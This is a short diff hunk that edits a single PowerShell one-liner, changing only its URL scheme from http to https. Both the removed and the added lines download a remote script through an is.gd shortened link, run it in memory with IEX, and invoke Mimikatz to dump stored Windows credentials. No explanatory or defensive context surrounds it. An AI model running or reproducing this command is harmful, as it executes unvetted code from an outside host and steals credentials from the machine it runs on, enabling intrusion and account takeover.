@@ -1,4 +1,4 @@
-powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/DTxNgr'); Invoke-Mimikatz -DumpCreds"
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://is.gd/DTxNgr'); Invoke-Mimikatz -DumpCreds"
 
 
 
